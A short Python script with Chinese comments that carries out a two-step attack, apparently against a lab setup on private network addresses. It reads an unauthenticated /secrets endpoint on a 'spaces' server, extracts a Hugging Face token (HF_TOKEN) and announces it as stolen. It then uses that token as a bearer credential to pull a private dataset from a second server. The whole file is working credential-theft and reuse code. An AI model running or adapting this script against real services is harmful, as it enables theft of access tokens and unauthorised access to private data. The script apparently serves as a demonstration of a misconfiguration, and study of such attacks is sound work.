import requests

SPACES_SERVER = "http://172.22.0.20:8080"
PRIVATE_REPO  = "http://172.22.0.30:9090"

# Step 1: 访问 spaces_server 上没有鉴权的 /secrets 接口
# 正常情况下这个接口不应该公开，但配置错误导致任何人都能访问
print("Step 1: 读取 spaces_server 暴露的 secrets...")
response = requests.get(f"{SPACES_SERVER}/secrets")
print(f"返回内容:\n{response.text}\n")

# 从返回内容中提取 HF Token
token = None
for line in response.text.splitlines():
    if line.startswith("HF_TOKEN="):
        token = line.split("=", 1)[1]
        break

if not token:
    print("未找到 HF_TOKEN，攻击失败")
    exit(1)

print(f"成功窃取 HF Token: {token}\n")

# Step 2: 用窃取的 token 访问 private_repo_server 的受保护接口
# private_repo_server 信任这个 token，因为它本来就是合法的 HF Token
print("Step 2: 使用窃取的 token 访问私有仓库...")
headers = {"Authorization": f"Bearer {token}"}
response = requests.get(f"{PRIVATE_REPO}/dataset", headers=headers)

if response.status_code == 200:
    print(f"成功获取私有数据:\n{response.text}")
else:
    print(f"访问失败: {response.status_code} {response.text}")
